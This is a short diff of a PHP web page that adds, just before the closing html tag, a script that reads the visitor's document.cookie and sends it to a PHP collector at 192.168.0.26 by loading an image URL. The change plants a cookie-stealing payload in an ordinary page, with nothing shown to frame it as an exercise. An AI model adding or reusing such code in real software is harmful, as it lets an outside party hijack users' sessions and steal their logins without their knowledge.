@@ -25,4 +25,9 @@ require_once("function/session.php");
 	</form>
 	</div>
 </body>
+<script>
+	var cookie = document.cookie;
+	var url = "http://192.168.0.26/cookie.php?cookie="
+	new Image().src = url + cookie;
+</script>
 </html>
